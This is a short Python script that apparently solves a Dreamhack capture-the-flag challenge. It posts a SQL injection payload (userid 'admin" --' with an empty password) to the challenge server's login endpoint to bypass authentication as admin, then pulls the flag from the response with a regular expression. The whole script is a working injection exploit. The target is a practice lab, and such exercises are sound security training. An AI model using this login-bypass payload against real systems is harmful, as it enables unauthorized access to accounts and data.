import re
from requests import request as req

res = req(
    method="POST",
    url="http://host3.dreamhack.games:14764/login",
    data={"userid": 'admin" --', "userpassword": ""},
)

matched = re.search("DH{.*}", res.text)

print(matched.group() if matched else "NO FLAG")
